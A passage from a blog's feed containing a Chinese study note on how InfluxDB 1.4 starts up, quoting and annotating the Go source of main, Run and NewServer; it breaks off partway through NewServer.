flex解析</p><p>使用flex词法解析器，yacc语法解析器。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;monit代码分析&quot;&gt;&lt;a href=&quot;#monit代码分析&quot; class=&quot;headerlink&quot; title=&quot;monit代码分析&quot;&gt;&lt;/a&gt;monit代码分析&lt;/h2&gt;&lt;p&gt;主要流程main函数:&lt;/p&gt;
&lt;figure class=&quot;highlight c
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>influxdb</title>
    <link href="http://www.mydreamdll.xyz/2020/01/17/influxdb1/"/>
    <id>http://www.mydreamdll.xyz/2020/01/17/influxdb1/</id>
    <published>2020-01-17T08:25:39.621Z</published>
    <updated>2020-01-17T08:25:39.621Z</updated>
    
    <content type="html"><![CDATA[<h3 id="influxdb-启动流程学习笔记"><a href="#influxdb-启动流程学习笔记" class="headerlink" title="influxdb 启动流程学习笔记"></a>influxdb 启动流程学习笔记</h3><h4 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h4><p>本文基于influxdb 1.4来进行分析代码</p><p>influxdb入口文件在 /cmd/influxd/main.go文件中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 主函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">rand.Seed(time.Now().UnixNano())</span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line">m := NewMain()</span><br><span class="line">    <span class="comment">// Run </span></span><br><span class="line"><span class="keyword">if</span> err := m.Run(os.Args[<span class="number">1</span>:]...); err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintln(os.Stderr, err)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NewMain函数初始化一个实例</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewMain return a new instance of Main.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewMain</span><span class="params">()</span> *<span class="title">Main</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;Main&#123;</span><br><span class="line">Stdin:  os.Stdin,</span><br><span class="line">Stdout: os.Stdout,</span><br><span class="line">Stderr: os.Stderr,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要流程在Run函数中，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run determines and runs the command specified by the CLI args.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *Main)</span> <span class="title">Run</span><span class="params">(args ...<span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">name, args := cmd.ParseCommandName(args)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Extract name from args.</span></span><br><span class="line"><span class="keyword">switch</span> name &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">""</span>, <span class="string">"run"</span>:</span><br><span class="line">        <span class="comment">// 默认执行流程</span></span><br><span class="line">cmd := run.NewCommand()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Tell the server the build details.</span></span><br><span class="line">cmd.Version = version</span><br><span class="line">cmd.Commit = commit</span><br><span class="line">cmd.Branch = branch</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行主要的函数</span></span><br><span class="line"><span class="keyword">if</span> err := cmd.Run(args...); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"run: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//中断信号量</span></span><br><span class="line">signalCh := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)</span><br><span class="line">signal.Notify(signalCh, os.Interrupt, syscall.SIGTERM)</span><br><span class="line">cmd.Logger.Info(<span class="string">"Listening for signals"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Block until one of the signals above is received</span></span><br><span class="line">&lt;-signalCh</span><br><span class="line">cmd.Logger.Info(<span class="string">"Signal received, initializing clean shutdown..."</span>)</span><br><span class="line"><span class="keyword">go</span> cmd.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Block again until another signal is received, a shutdown timeout elapses,</span></span><br><span class="line"><span class="comment">// or the Command is gracefully closed</span></span><br><span class="line">cmd.Logger.Info(<span class="string">"Waiting for clean shutdown..."</span>)</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-signalCh:</span><br><span class="line">cmd.Logger.Info(<span class="string">"Second signal received, initializing hard shutdown"</span>)</span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(time.Second * <span class="number">30</span>):</span><br><span class="line">cmd.Logger.Info(<span class="string">"Time limit reached, initializing hard shutdown"</span>)</span><br><span class="line"><span class="keyword">case</span> &lt;-cmd.Closed:</span><br><span class="line">cmd.Logger.Info(<span class="string">"Server shutdown completed"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// goodbye.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">"backup"</span>:</span><br><span class="line">        <span class="comment">//备份</span></span><br><span class="line">name := backup.NewCommand()</span><br><span class="line"><span class="keyword">if</span> err := name.Run(args...); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"backup: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"restore"</span>:</span><br><span class="line">        <span class="comment">//恢复</span></span><br><span class="line">name := restore.NewCommand()</span><br><span class="line"><span class="keyword">if</span> err := name.Run(args...); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"restore: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"config"</span>:</span><br><span class="line">        <span class="comment">//打印当前配置</span></span><br><span class="line"><span class="keyword">if</span> err := run.NewPrintConfigCommand().Run(args...); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"config: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"version"</span>:</span><br><span class="line"><span class="keyword">if</span> err := NewVersionCommand().Run(args...); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"version: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"help"</span>:</span><br><span class="line"><span class="keyword">if</span> err := help.NewCommand().Run(args...); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"help: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">`unknown command "%s"`</span>+<span class="string">"\n"</span>+<span class="string">`Run 'influxd help' for usage`</span>+<span class="string">"\n\n"</span>, name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先分析run部分：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run parses the config from args and runs the server.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(cmd *Command)</span> <span class="title">Run</span><span class="params">(args ...<span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="comment">// Parse the command line flags.</span></span><br><span class="line">options, err := cmd.ParseFlags(args...)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//解析配置文件</span></span><br><span class="line">config, err := cmd.ParseConfig(options.GetConfigPath())</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"parse config: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Apply any environment variables on top of the parsed config</span></span><br><span class="line"><span class="keyword">if</span> err := config.ApplyEnvOverrides(cmd.Getenv); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"apply env config: %v"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Propogate the top-level join options down to the meta config</span></span><br><span class="line">    <span class="comment">//解析join的集群环境下的iplist</span></span><br><span class="line"><span class="keyword">if</span> config.Join != <span class="string">""</span> &#123;</span><br><span class="line">config.Meta.JoinPeers = strings.Split(config.Join, <span class="string">","</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Command-line flags for -join and -hostname override the config</span></span><br><span class="line"><span class="comment">// and env variable</span></span><br><span class="line"><span class="keyword">if</span> options.Join != <span class="string">""</span> &#123;</span><br><span class="line">config.Meta.JoinPeers = strings.Split(options.Join, <span class="string">","</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析本地hostname</span></span><br><span class="line"><span class="keyword">if</span> options.Hostname != <span class="string">""</span> &#123;</span><br><span class="line">config.Hostname = options.Hostname</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Propogate the top-level hostname down to dependendent configs</span></span><br><span class="line">config.Meta.RemoteHostname = config.Hostname</span><br><span class="line"></span><br><span class="line"><span class="comment">// Validate the configuration.</span></span><br><span class="line">    <span class="comment">// 检查各个配置是否为空</span></span><br><span class="line"><span class="keyword">if</span> err := config.Validate(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"%s. To generate a valid configuration file run `influxd config &gt; influxdb.generated.conf`"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> logErr error</span><br><span class="line"><span class="keyword">if</span> cmd.Logger, logErr = config.Logging.New(cmd.Stderr); logErr != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// assign the default logger</span></span><br><span class="line">cmd.Logger = logger.New(cmd.Stderr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Attempt to run pprof on :6060 before startup if debug pprof enabled.</span></span><br><span class="line">    <span class="comment">//是否开启pprof</span></span><br><span class="line"><span class="keyword">if</span> config.HTTPD.DebugPprofEnabled &#123;</span><br><span class="line">runtime.SetBlockProfileRate(<span class="keyword">int</span>(<span class="number">1</span> * time.Second))</span><br><span class="line">runtime.SetMutexProfileFraction(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; http.ListenAndServe(<span class="string">"localhost:6060"</span>, <span class="literal">nil</span>) &#125;()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Print sweet InfluxDB logo.</span></span><br><span class="line">    <span class="comment">// 打印logo</span></span><br><span class="line"><span class="keyword">if</span> !config.Logging.SuppressLogo &amp;&amp; logger.IsTerminal(cmd.Stdout) &#123;</span><br><span class="line">fmt.Fprint(cmd.Stdout, logo)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Mark start-up in log.</span></span><br><span class="line">cmd.Logger.Info(<span class="string">"InfluxDB starting"</span>,</span><br><span class="line">zap.String(<span class="string">"version"</span>, cmd.Version),</span><br><span class="line">zap.String(<span class="string">"branch"</span>, cmd.Branch),</span><br><span class="line">zap.String(<span class="string">"commit"</span>, cmd.Commit))</span><br><span class="line">cmd.Logger.Info(<span class="string">"Go runtime"</span>,</span><br><span class="line">zap.String(<span class="string">"version"</span>, runtime.Version()),</span><br><span class="line">zap.Int(<span class="string">"maxprocs"</span>, runtime.GOMAXPROCS(<span class="number">0</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">// If there was an error on startup when creating the logger, output it now.</span></span><br><span class="line"><span class="keyword">if</span> logErr != <span class="literal">nil</span> &#123;</span><br><span class="line">cmd.Logger.Error(<span class="string">"Unable to configure logger"</span>, zap.Error(logErr))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write the PID file.</span></span><br><span class="line">    <span class="comment">// 写入pid文件</span></span><br><span class="line"><span class="keyword">if</span> err := cmd.writePIDFile(options.PIDFile); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"write pid file: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">cmd.pidfile = options.PIDFile</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> config.HTTPD.PprofEnabled &#123;</span><br><span class="line"><span class="comment">// Turn on block and mutex profiling.</span></span><br><span class="line">runtime.SetBlockProfileRate(<span class="keyword">int</span>(<span class="number">1</span> * time.Second))</span><br><span class="line">runtime.SetMutexProfileFraction(<span class="number">1</span>) <span class="comment">// Collect every sample</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create server from config and start it.</span></span><br><span class="line">    <span class="comment">// 初始化服务器</span></span><br><span class="line">buildInfo := &amp;BuildInfo&#123;</span><br><span class="line">Version: cmd.Version,</span><br><span class="line">Commit:  cmd.Commit,</span><br><span class="line">Branch:  cmd.Branch,</span><br><span class="line">Time:    cmd.BuildTime,</span><br><span class="line">&#125;</span><br><span class="line">s, err := NewServer(config, buildInfo)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"create server: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">s.Logger = cmd.Logger</span><br><span class="line">s.CPUProfile = options.CPUProfile</span><br><span class="line">s.MemProfile = options.MemProfile</span><br><span class="line">     <span class="comment">// 启动</span></span><br><span class="line"><span class="keyword">if</span> err := s.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"open server: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">cmd.Server = s</span><br><span class="line"></span><br><span class="line"><span class="comment">// Begin monitoring the server's error channel.</span></span><br><span class="line"><span class="keyword">go</span> cmd.monitorServerErrors()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化函数NewServer</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewServer returns a new instance of Server built from a config.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewServer</span><span class="params">(c *Config, buildInfo *BuildInfo)</span> <span class="params">(*Server, error)</span></span> &#123;</span><br><span class="line"><span class="comment">// We need to ensure that a meta directory always exists even if</span></span><br><span class="line"><span class="comment">// we don't start the meta store.  node.json is always stored under</span></span><br><span class="line"><span class="comment">// the meta directory.</span></span><br><span class="line">    <span class="comment">// 建立元数据目录，并加权</span></span><br><span class="line"><span class="keyword">if</span> err := os.MkdirAll(c.Meta.Dir, <span class="number">0777</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">"mkdir all: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0.10-rc1 and prior would sometimes put the node.json at the root</span></span><br><span class="line"><span class="comment">// dir which breaks backup/restore and restarting nodes.  This moves</span></span><br><span class="line"><span class="comment">// the file from the root so it's always under the meta dir.</span></span><br><span class="line">    <span class="comment">//移动和恢复节点信息</span></span><br><span class="line">oldPath := filepath.Join(filepath.Dir(c.Meta.Dir), <span class="string">"node.json"</span>)</span><br><span class="line">newPath := filepath.Join(c.Meta.Dir, <span class="string">"node.json"</span>)</span><br><span class="line"><span class="comment">//修改</span></span><br><span class="line"><span class="keyword">if</span> _, err := os.Stat(oldPath); err == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := os.Rename(oldPath, newPath); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 从磁盘中加载节点信息</span></span><br><span class="line">node, err := influxdb.LoadNode(c.Meta.Dir)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> !os.IsNotExist(err) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//不存在则新建</span></span><br><span class="line">node = influxdb.NewNode(c.Meta.Dir)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//if err := raftDBExists(c.Meta.Dir); err != nil &#123;</span></span><br><span class="line"><span class="comment">//return nil, err</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// In 0.10.0 bind-address got moved to the top level. Check</span></span><br><span class="line"><span class="comment">// The old location to keep things backwards compatible</span></span><br><span class="line">bind := c.BindAddress</span><br><span class="line"><span class="keyword">if</span> c.Meta.BindAddress != <span class="string">""</span> &#123;</span><br><span class="line">bind = c.Meta.BindAddress</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断元数据是否打开</span></span><br><span class="line"><span class="keyword">if</span> !c.Data.Enabled &amp;&amp; !c.Meta.Enabled &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">"must run as either meta node or data node or both"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line">s := &amp;Server&#123;</span><br><span class="line">buildInfo: *buildInfo,</span><br><span class="line">err:       <span class="built_in">make</span>(<span class="keyword">chan</span> error),</span><br><span class="line">closing:   <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line"></span><br><span class="line">Node:        node,</span><br><span class="line">BindAddress: bind,</span><br><span class="line"></span><br><span class="line">Logger: logger.New(os.Stderr),</span><br><span class="line"></span><br><span class="line"><span class="comment">//MetaClient: meta.NewClient(c.Meta),</span></span><br><span class="line">MetaClient: meta.NewClient(),  </span><br><span class="line"></span><br><span class="line">reportingDisabled: c.ReportingDisabled,</span><br><span class="line">joinPeers:         c.Meta.JoinPeers,</span><br><span class="line">metaUseTLS:        c.Meta.HTTPSEnabled,</span><br><span class="line"></span><br><span class="line">httpAPIAddr: c.HTTPD.BindAddress,   <span class="comment">// http服务bind地址</span></span><br><span class="line">httpUseTLS:  c.HTTPD.HTTPSEnabled,   <span class="comment">//https打开</span></span><br><span class="line">tcpAddr:     bind,</span><br><span class="line"></span><br><span class="line">config: c,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//初始化元数据服务</span></span><br><span class="line"><span class="keyword">if</span> c.Meta.Enabled &#123;</span><br><span class="line">s.MetaService = meta.NewService(c.Meta)</span><br><span class="line">s.MetaService.Version = s.buildInfo.Version</span><br><span class="line">s.MetaService.Node = s.Node</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> c.AdminCluster.Enabled &#123;</span><br><span class="line">s.AdminClusterService = admin_cluster.NewService(c.AdminCluster)</span><br><span class="line">s.AdminClusterService.Version = s.buildInfo.Version</span><br><span class="line">s.AdminClusterService.Handler.MetaClient = s.MetaClient</span><br><span class="line">s.AdminClusterService.TCPHandler.MetaClient = s.MetaClient</span><br><span class="line">s.AdminClusterService.TCPHandler.Server = s</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//初始化监控信息</span></span><br><span class="line">s.Monitor = monitor.New(s, c.Monitor)</span><br><span class="line">s.config.registerDiagnostics(s.Monitor)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> c.Data.Enabled &#123;</span><br><span class="line">        <span class="comment">//初始化tsdb</span></span><br><span class="line">s.TSDBStore = tsdb.NewStore(c.Data.Dir)</span><br><span class="line">s.TSDBStore.EngineOptions.Config = c.Data</span><br><span class="line"></span><br><span class="line">s.AdminClusterService.TCPHandler.TSDBStore = s.TSDBStore</span><br><span class="line"></span><br><span class="line"><span class="comment">// Copy TSDB configuration.</span></span><br><span class="line">s.TSDBStore.EngineOptions.EngineVersion = c.Data.Engine</span><br><span class="line">s.TSDBStore.EngineOptions.IndexVersion = c.Data.Index</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create the Subscriber service</span></span><br><span class="line">s.Subscriber = subscriber.NewService(c.Subscriber)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set the shard writer</span></span><br><span class="line">s.ShardWriter = cluster.NewShardWriter(time.Duration(c.Cluster.ShardWriterTimeout), c.Cluster.MaxRemoteWriteConnections)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create the hinted handoff 